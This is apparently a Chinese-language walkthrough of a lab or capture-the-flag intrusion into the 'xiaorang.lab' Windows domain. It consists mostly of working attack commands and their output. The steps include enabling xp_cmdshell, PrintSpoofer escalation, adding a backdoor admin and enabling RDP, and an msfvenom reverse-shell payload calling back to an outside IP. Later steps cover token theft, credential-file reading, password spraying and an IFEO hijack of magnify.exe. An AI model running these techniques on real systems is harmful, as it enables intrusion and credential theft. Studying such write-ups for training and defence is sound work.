<p>参考文章：</p>
<p><a href="https://xz.aliyun.com/news/7129">https://xz.aliyun.com/news/7129</a></p>
<p>判断xp_cmdshell状态</p>
<pre tabindex="0"><code>select * from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;
</code></pre><p><img alt="image-20250309190544521" loading="lazy" src="../assets/image-20250309190544521.png"></p>
<p>存在</p>
<p>那我们接下来启动它</p>
<pre tabindex="0"><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;
</code></pre><pre tabindex="0"><code>配置选项 &#39;xp_cmdshell&#39; 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。
</code></pre><p>启动成功</p>
<p>接下来就可以进行命令执行了</p>
<pre tabindex="0"><code>exec master..xp_cmdshell &#39;whoami&#39;
</code></pre><p><img alt="image-20250309190932671" loading="lazy" src="../assets/image-20250309190932671.png"></p>
<p>接下来直接vshell一句话上线</p>
<p><img alt="image-20250309192014708" loading="lazy" src="../assets/image-20250309192014708.png"></p>
<p>没找到flag，发现Administrator文件夹没有权限</p>
<p>想到要提权，传一个PrintSpoofer进行提权</p>
<p><a href="https://github.com/whojeff/PrintSpoofer">https://github.com/whojeff/PrintSpoofer</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln">1</span><span class="cl">PrintSpoofer.exe -i -c cmd
</span></span></code></pre></div><p><img alt="image-20250312192829416" loading="lazy" src="../assets/image-20250312192829416.png"></p>
<p>提权之后拿到flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">C<span class="p">:</span><span class="nl">\Tmp</span><span class="c1">&gt;type C:\Users\Administrator\flag\flag01.txt</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"> _________  ________  ________  ___       ___  _______   ________   _________
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="p">|</span>\___   ___\\   ____\<span class="p">|</span>\   ____\<span class="p">|</span>\  \     <span class="p">|</span>\  \<span class="p">|</span>\  ___ \ <span class="p">|</span>\   ___  \<span class="p">|</span>\___   ___\
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">\<span class="p">|</span>___ \  \_\ \  \___<span class="p">|</span>\ \  \___<span class="p">|</span>\ \  \    \ \  \ \   __/<span class="p">|</span>\ \  \\ \  \<span class="p">|</span>___ \  \_<span class="p">|</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_<span class="p">|</span>/_\ \  \\ \  \   \ \  \
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">      \ \  \ \<span class="p">|</span>____<span class="p">|</span>\  \ \  \____\ \  \____\ \  \ \  \_<span class="p">|</span>\ \ \  \\ \  \   \ \  \
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        \<span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>\_________\<span class="p">|</span>_______<span class="p">|</span>\<span class="p">|</span>_______<span class="p">|</span>\<span class="p">|</span>__<span class="p">|</span>\<span class="p">|</span>_______<span class="p">|</span>\<span class="p">|</span>__<span class="p">|</span> \<span class="p">|</span>__<span class="p">|</span>    \<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">              \<span class="p">|</span>_________<span class="p">|</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">Getting flag01 is easy, right?
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4}
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl">Maybe you should focus on user sessions...
</span></span></code></pre></div><p>提权之后用提权后的账户重新上一下线</p>
<p>接下来用fscan扫一下内网</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">┌──────────────────────────────────────────────┐
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">│    ___                              _        │
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">│   / _ \     ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __    │
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">│  / /_\/____/ __<span class="p">|</span>/ __<span class="p">|</span> &#39;__/ _` <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /    │
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">│ / /_\\_____\__ \ (__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">(</span>__<span class="p">|</span>   <span class="p">&lt;</span>     │
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">│ \____/     <span class="p">|</span>___/\___<span class="p">|</span>_<span class="p">|</span>  \__,_<span class="p">|</span>\___<span class="p">|</span>_<span class="p">|</span>\_\    │
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">└──────────────────────────────────────────────┘
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      Fscan Version: 2.0.0
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1
</span></span><span class="line"><span class="ln">11</span><span class="cl">[2025-03-09 19:53:19] [INFO] 开始信息扫描
</span></span><span class="line"><span class="ln">12</span><span class="cl">[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255
</span></span><span class="line"><span class="ln">13</span><span class="cl">[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.<span class="nv">%!d(string=172.22.8.255) - %!s(MISSING).%!</span>d(MISSING<span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -<span class="p">&gt;</span> IP范围 172.22.8.0-172.22.8.255
</span></span><span class="line"><span class="ln">15</span><span class="cl">[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256
</span></span><span class="line"><span class="ln">16</span><span class="cl">[2025-03-09 19:53:20] [INFO] 开始主机扫描
</span></span><span class="line"><span class="ln">17</span><span class="cl">[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测...
</span></span><span class="line"><span class="ln">18</span><span class="cl">[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包
</span></span><span class="line"><span class="ln">19</span><span class="cl">[2025-03-09 19:53:20] [INFO] 切换为PING方式探测...
</span></span><span class="line"><span class="ln">20</span><span class="cl">[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31     存活 (ICMP<span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18     存活 (ICMP)
</span></span><span class="line"><span class="ln">22</span><span class="cl">[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15     存活 (ICMP)
</span></span><span class="line"><span class="ln">23</span><span class="cl">[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46     存活 (ICMP)
</span></span><span class="line"><span class="ln">24</span><span class="cl">[2025-03-09 19:53:23] [INFO] 存活主机数量: 4
</span></span><span class="line"><span class="ln">25</span><span class="cl">[2025-03-09 19:53:23] [INFO] 有效端口数量: 233
</span></span><span class="line"><span class="ln">26</span><span class="cl">[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88
</span></span><span class="line"><span class="ln">27</span><span class="cl">[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80
</span></span><span class="line"><span class="ln">28</span><span class="cl">[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80
</span></span><span class="line"><span class="ln">29</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139
</span></span><span class="line"><span class="ln">30</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139
</span></span><span class="line"><span class="ln">31</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135
</span></span><span class="line"><span class="ln">32</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135
</span></span><span class="line"><span class="ln">33</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135
</span></span><span class="line"><span class="ln">34</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135
</span></span><span class="line"><span class="ln">35</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139
</span></span><span class="line"><span class="ln">36</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139
</span></span><span class="line"><span class="ln">37</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445
</span></span><span class="line"><span class="ln">38</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445
</span></span><span class="line"><span class="ln">39</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445
</span></span><span class="line"><span class="ln">40</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445
</span></span><span class="line"><span class="ln">41</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389
</span></span><span class="line"><span class="ln">42</span><span class="cl">[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433
</span></span><span class="line"><span class="ln">43</span><span class="cl">[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =&gt; 
</span></span><span class="line"><span class="ln">44</span><span class="cl">[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">45</span><span class="cl">[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">46</span><span class="cl">[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln">47</span><span class="cl">[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln">48</span><span class="cl">[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln">49</span><span class="cl">[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln">50</span><span class="cl">[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =&gt; 
</span></span><span class="line"><span class="ln">51</span><span class="cl">[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =&gt; 
</span></span><span class="line"><span class="ln">52</span><span class="cl">[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =&gt; 
</span></span><span class="line"><span class="ln">53</span><span class="cl">[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =&gt; 
</span></span><span class="line"><span class="ln">54</span><span class="cl">[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =<span class="p">&gt;</span> [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.]
</span></span><span class="line"><span class="ln">55</span><span class="cl">[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =&gt; 
</span></span><span class="line"><span class="ln">56</span><span class="cl">[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =&gt; 
</span></span><span class="line"><span class="ln">57</span><span class="cl">[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =&gt; 
</span></span><span class="line"><span class="ln">58</span><span class="cl">[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =&gt; 
</span></span><span class="line"><span class="ln">59</span><span class="cl">[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =&gt; 
</span></span><span class="line"><span class="ln">60</span><span class="cl">[2025-03-09 19:54:29] [INFO] 存活端口数量: 17
</span></span><span class="line"><span class="ln">61</span><span class="cl">[2025-03-09 19:54:30] [INFO] 开始漏洞扫描
</span></span><span class="line"><span class="ln">62</span><span class="cl">[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle
</span></span><span class="line"><span class="ln">63</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果
</span></span><span class="line"><span class="ln">64</span><span class="cl">目标主机: 172.22.8.18
</span></span><span class="line"><span class="ln">65</span><span class="cl">主机名: WIN-WEB
</span></span><span class="line"><span class="ln">66</span><span class="cl">发现的网络接口:
</span></span><span class="line"><span class="ln">67</span><span class="cl">   IPv4地址:
</span></span><span class="line"><span class="ln">68</span><span class="cl">      └─ 172.22.8.18
</span></span><span class="line"><span class="ln">69</span><span class="cl">   IPv6地址:
</span></span><span class="line"><span class="ln">70</span><span class="cl">      └─ 2001:0:348b:fb58:1445:3719:d89d:8092
</span></span><span class="line"><span class="ln">71</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         
</span></span><span class="line"><span class="ln">72</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果
</span></span><span class="line"><span class="ln">73</span><span class="cl">目标主机: 172.22.8.15
</span></span><span class="line"><span class="ln">74</span><span class="cl">主机名: DC01
</span></span><span class="line"><span class="ln">75</span><span class="cl">发现的网络接口:
</span></span><span class="line"><span class="ln">76</span><span class="cl">   IPv4地址:
</span></span><span class="line"><span class="ln">77</span><span class="cl">      └─ 172.22.8.15
</span></span><span class="line"><span class="ln">78</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果
</span></span><span class="line"><span class="ln">79</span><span class="cl">目标主机: 172.22.8.46
</span></span><span class="line"><span class="ln">80</span><span class="cl">主机名: WIN2016
</span></span><span class="line"><span class="ln">81</span><span class="cl">发现的网络接口:
</span></span><span class="line"><span class="ln">82</span><span class="cl">   IPv4地址:
</span></span><span class="line"><span class="ln">83</span><span class="cl">      └─ 172.22.8.46
</span></span><span class="line"><span class="ln">84</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果
</span></span><span class="line"><span class="ln">85</span><span class="cl">目标主机: 172.22.8.31
</span></span><span class="line"><span class="ln">86</span><span class="cl">主机名: WIN19-CLIENT
</span></span><span class="line"><span class="ln">87</span><span class="cl">发现的网络接口:
</span></span><span class="line"><span class="ln">88</span><span class="cl">   IPv4地址:
</span></span><span class="line"><span class="ln">89</span><span class="cl">      └─ 172.22.8.31
</span></span><span class="line"><span class="ln">90</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
</span></span><span class="line"><span class="ln">91</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15     DC:XIAORANG\DC01           
</span></span><span class="line"><span class="ln">92</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46        状态码:200 长度:703    标题:IIS Windows Server
</span></span><span class="line"><span class="ln">93</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18        状态码:200 长度:703    标题:IIS Windows Server
</span></span><span class="line"><span class="ln">94</span><span class="cl">[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ
</span></span><span class="line"><span class="ln">95</span><span class="cl">[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32
</span></span></code></pre></div><p>扫到三台机子</p>
<pre tabindex="0"><code>NetBios 172.22.8.46  WIN2016.xiaorang.lab 
NetBios 172.22.8.31  XIAORANG\WIN19-CLIENT
NetBios 172.22.8.15  DC:XIAORANG\DC01
</code></pre><p>没有什么能直接利用的服务</p>
<p>那我们接着信息收集一下</p>
<pre tabindex="0"><code>net user
</code></pre><pre tabindex="0"><code>主机名:           WIN-WEB
OS 名称:          Microsoft Windows Server 2016 Datacenter
OS 版本:          10.0.14393 暂缺 Build 14393
OS 制造商:        Microsoft Corporation
OS 配置:          独立服务器
OS 构件类型:      Multiprocessor Free
注册的所有人:
注册的组织:       Aliyun
产品 ID:          00376-40000-00000-AA947
初始安装日期:     2022/7/11, 12:46:14
系统启动时间:     2025/3/9, 18:28:29
系统制造商:       Alibaba Cloud
系统型号:         Alibaba Cloud ECS
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
BIOS 版本:        SeaBIOS 449e491, 2014/4/1
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     3,950 MB
可用的物理内存:   883 MB
虚拟内存: 最大值: 5,848 MB
虚拟内存: 可用:   1,169 MB
虚拟内存: 使用中: 4,679 MB
页面文件位置:     C:\pagefile.sys
域:               WORKGROUP
登录服务器:       暂缺
修补程序:         安装了 6 个修补程序。
                  [01]: KB5013625
                  [02]: KB4049065
                  [03]: KB4486129
                  [04]: KB4486131
                  [05]: KB5014026
                  [06]: KB5013952
网卡:             安装了 1 个 NIC。
                  [01]: Red Hat VirtIO Ethernet Adapter
                      连接名:      以太网
                      启用 DHCP:   是
                      DHCP 服务器: 172.22.255.253
                      IP 地址
                        [01]: 172.22.8.18
                        [02]: fe80::205a:dd47:2165:6397
Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
</code></pre><pre tabindex="0"><code>C:\Tmp&gt;net user

\\ 的用户帐户

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
John                     test
命令运行完毕，但发生一个或多个错误。
</code></pre><pre tabindex="0"><code>C:\Tmp&gt;quser
 用户名                会话名             ID  状态    空闲时间   登录时间
 john                  rdp-tcp#0           2  运行中       2:38  2025/3/9 18:30
</code></pre><p>发现一个john用户远程连接本台机子</p>
<p>为了方便可以新建一个用户rdp连上去</p>
<pre tabindex="0"><code>C:\Tmp&gt;net user xrntkk Abc20060201 /add
命令成功完成。

C:\Tmp&gt;net localgroup administrators xrntkk /add
命令成功完成。

C:\Tmp&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
操作成功完成。
</code></pre><p><img alt="image-20250309212215376" loading="lazy" src="../assets/image-20250309212215376.png"></p>
<p>管理员权限可以偷RDP用户的token，从而查看其挂载的盘。</p>
<p>这里可以用msf的incognito模块</p>
<pre tabindex="0"><code>ubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231  LPORT=9999 -f exe -o msf.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: msf.exe
</code></pre><p>先用msf上个线</p>
<pre tabindex="0"><code>msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 106.55.168.231
set lport 9999
exploit
</code></pre><p><img alt="image-20250309215543675" loading="lazy" src="../assets/image-20250309215543675.png"></p>
<p>上线</p>
<p>接着用incognito模块偷John的token</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">meterpreter <span class="p">&gt;</span> use incognito
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Loading extension incognito...Success.
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">meterpreter <span class="p">&gt;</span> list_tokens -u
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Delegation Tokens Available
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">========================================
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">IIS APPPOOL\DefaultAppPool
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">NT AUTHORITY\LOCAL SERVICE
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">NT AUTHORITY\NETWORK SERVICE
</span></span><span class="line"><span class="ln">10</span><span class="cl">NT AUTHORITY\SYSTEM
</span></span><span class="line"><span class="ln">11</span><span class="cl">NT SERVICE\MsDtsServer130
</span></span><span class="line"><span class="ln">12</span><span class="cl">NT SERVICE\MSSQLFDLauncher
</span></span><span class="line"><span class="ln">13</span><span class="cl">NT SERVICE\MSSQLSERVER
</span></span><span class="line"><span class="ln">14</span><span class="cl">NT SERVICE\MSSQLServerOLAPService
</span></span><span class="line"><span class="ln">15</span><span class="cl">NT SERVICE\ReportServer
</span></span><span class="line"><span class="ln">16</span><span class="cl">NT SERVICE\SQLTELEMETRY
</span></span><span class="line"><span class="ln">17</span><span class="cl">NT SERVICE\SSASTELEMETRY
</span></span><span class="line"><span class="ln">18</span><span class="cl">NT SERVICE\SSISTELEMETRY130
</span></span><span class="line"><span class="ln">19</span><span class="cl">WIN-WEB\John
</span></span><span class="line"><span class="ln">20</span><span class="cl">WIN-WEB\test
</span></span><span class="line"><span class="ln">21</span><span class="cl">WIN-WEB\xrntkk
</span></span><span class="line"><span class="ln">22</span><span class="cl">Window Manager\DWM-1
</span></span><span class="line"><span class="ln">23</span><span class="cl">Window Manager\DWM-2
</span></span><span class="line"><span class="ln">24</span><span class="cl">Window Manager\DWM-3
</span></span><span class="line"><span class="ln">25</span><span class="cl">Window Manager\DWM-4
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">Impersonation Tokens Available
</span></span><span class="line"><span class="ln">28</span><span class="cl">========================================
</span></span><span class="line"><span class="ln">29</span><span class="cl">No tokens available
</span></span></code></pre></div><p>可以看到已经拿到John的token了</p>
<p>以John的身份运行cmd</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">meterpreter <span class="p">&gt;</span> impersonate_token WIN-WEB\\John
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">[+] Delegation token available
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">[+] Successfully impersonated user WIN-WEB\John
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">meterpreter <span class="p">&gt;</span> shell
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Process 7508 created.
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Channel 1 created.
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">...
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">C<span class="p">:</span><span class="nl">\Tmp</span><span class="c1">&gt;whoami</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">whoami
</span></span><span class="line"><span class="ln">11</span><span class="cl">win-web\john
</span></span></code></pre></div><pre tabindex="0"><code>net use
</code></pre><p><img alt="image-20250309220249284" loading="lazy" src="../assets/image-20250309220249284.png"></p>
<p>看一下挂载情况（不知道为啥我这乱码了）</p>
<p>挂载了c盘</p>
<p>查看c盘中的credential.txt文件</p>
<pre tabindex="0"><code>C:\Tmp&gt;type \\TSCLIENT\C\credential.txt
type \\TSCLIENT\C\credential.txt
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
</code></pre><p>这里有一串账号密码，用这串账号密码进行一个密码喷洒</p>
<pre tabindex="0"><code>crackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!#
</code></pre><pre tabindex="0"><code>┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]
└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24
 -u Aldrich -p Ald@rLMWuy7Z
SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)
SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE
SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
SMB         172.22.8.18     445    WIN-WEB          [-] WIN-WEB\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE
SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE
</code></pre><p>可以看到这三台机貌似都能登上去</p>
<pre tabindex="0"><code>SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
</code></pre><p>我这里选择登31</p>
<pre tabindex="0"><code>proxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p &#39;Ald@rLMWuy7Z!#&#39;
</code></pre><p>这里要用rdesktop登，rdp登不上</p>
<p>会提示密码过期，改个密码就行了</p>
<p><img alt="image-20250309223025272" loading="lazy" src="../assets/image-20250309223025272.png"></p>
<pre tabindex="0"><code></code></pre><p>但是改完密码这台机还是登不上，没有登陆权限</p>
<p>所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子</p>
<p>成功在46中登入，后面还是用rdp吧，rdesktop也太卡了</p>
<pre tabindex="0"><code>xiaorang.lab\Aldrich
Abc123456
</code></pre><h3 id="flag2">FLAG2<a hidden class="anchor" aria-hidden="true" href="#flag2">#</a></h3>
<p>信息收集一下</p>
<p>可以看到我们已经拿下域内的一台机子了</p>
<pre tabindex="0"><code>systeminfo
</code></pre><p><img alt="image-20250309235305060" loading="lazy" src="../assets/image-20250309235305060.png"></p>
<p>接着我们用bloodhound来进行一下域内信息收集</p>
<pre tabindex="0"><code>SharpHound.exe -c all
</code></pre><p><img alt="image-20250312194209589" loading="lazy" src="../assets/image-20250312194209589.png"></p>
<p>将数据采集完生成的zip文件，上传导入到BloodHound分析</p>
<p><img alt="undefined" loading="lazy" src="../assets/undefined.png"></p>
<p>从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控</p>
<p>根据前面的hint</p>
<pre tabindex="0"><code>Do you know how to hijack Image?
</code></pre><p>我们可以知道接下来要进行镜像劫持(IFEO)提权</p>
<pre tabindex="0"><code>Get-ACL -Path &#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&#34; | fl
</code></pre><p>这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。</p>
<p><img alt="image-20250312203230115" loading="lazy" src="../assets/image-20250312203230115.png"></p>
<pre tabindex="0"><code>NT AUTHORITY\Authenticated Users
</code></pre><p>我们可以发现全部已登录用户都可以对注册表进行修改</p>
<p>那我们就可以通过修改注册表进行映像劫持</p>
<p>我们这里通过将放大镜启动的magnify.exe替换成C:\windows\system32\cmd.exe，来进行提权</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln">1</span><span class="cl">REG ADD <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&#34;</span> /v Debugger /t REG_SZ /d <span class="s2">&#34;C:\windows\system32\cmd.exe&#34;</span>
</span></span></code></pre></div><p>修改后选择锁定</p>
<p><img alt="image-20250312204030378" loading="lazy" src="../assets/image-20250312204030378.png"></p>
<p>在锁定页面选择放大镜即可</p>
<p><img alt="image-20250312204318481" loading="lazy" src="../assets/image-20250312204318481-1741783399075-2.png"></p>
